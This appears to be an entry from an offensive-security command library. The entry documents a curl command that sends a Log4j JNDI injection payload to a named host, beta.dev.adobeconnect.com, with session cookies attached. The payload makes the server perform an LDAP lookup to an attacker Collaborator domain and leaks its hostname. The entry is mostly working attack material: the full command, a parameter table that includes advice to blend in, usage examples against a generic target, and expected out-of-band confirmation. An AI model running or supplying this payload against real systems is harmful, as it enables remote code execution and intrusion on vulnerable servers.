---
id: uuid-for-command
data: >-
  curl -X GET
  "https://beta.dev.adobeconnect.com/?x=\${jndi:ldap://\${hostName}.attacker.burpcollaborator.net/a}"
  -H "Host: beta.dev.adobeconnect.com" -H "User-Agent: Mozilla/5.0 (Windows NT
  10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0" -H "Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
  -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate" -H
  "Connection: close" -H "Cookie: BREEZESESSION=breezdiekv3smcc2xdw3u;
  BreezeCCookie=conn-BZTI-9BM9-2M7O-HWCG-XCF2-KDFT-KN7O-Y78S" -H
  "Upgrade-Insecure-Requests: 1" -H "Sec-Fetch-Dest: document" -H
  "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-Site: none" -H "Sec-Fetch-User: ?1"
tags:
  - rce
  - log4j
  - jndi
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:49.096Z'
verified: false
validated: true
submitted: true
---
---

# send-malicious-get-with-jndi-payload

## Command

```bash
curl -X GET "https://beta.dev.adobeconnect.com/?x=\${jndi:ldap://\${hostName}.attacker.burpcollaborator.net/a}" -H "Host: beta.dev.adobeconnect.com" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate" -H "Connection: close" -H "Cookie: BREEZESESSION=breezdiekv3smcc2xdw3u; BreezeCCookie=conn-BZTI-9BM9-2M7O-HWCG-XCF2-KDFT-KN7O-Y78S" -H "Upgrade-Insecure-Requests: 1" -H "Sec-Fetch-Dest: document" -H "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-Site: none" -H "Sec-Fetch-User: ?1"
```

## Description

This curl command sends a crafted HTTP GET request to exploit Log4j JNDI injection by including a malicious payload in the 'x' query parameter, which triggers an LDAP lookup when logged by the vulnerable server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `https://beta.dev.adobeconnect.com/?x=\${jndi:ldap://\${hostName}.attacker.burpcollaborator.net/a}` | Target URL with JNDI payload in 'x' parameter; replace domain with your Collaborator subdomain | Yes |
| `-H "Host: ..."` | Sets the Host header | Yes |
| `-H "User-Agent: ..."` | Mimics a browser User-Agent to blend in | Yes |
| `-H "Cookie: ..."` | Includes session cookies if needed for the endpoint | No |
| Other `-H` flags | Standard browser headers for realism | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://target.com/?x=\${jndi:ldap://attacker.burpcollaborator.net/a}" -H "Host: target.com"
```

### Advanced Usage

```bash
curl -X GET "https://beta.dev.adobeconnect.com/?x=\${jndi:ldap://\${hostName}.attacker.burpcollaborator.net/a}" -H "Host: beta.dev.adobeconnect.com" -H "User-Agent: Mozilla/5.0 ..." -H "Cookie: BREEZESESSION=..." --verbose
```

## Expected Output

HTTP/1.1 200 OK response with the server's HTML content, indicating the request was processed. No direct error, but monitor external tools for OOB confirmation like DNS queries to the payload domain.

## Related

- [[Related Procedure|procedures/Trigger-Log4j-JNDI-Lookup-via-Malicious-Query-Parameter]]
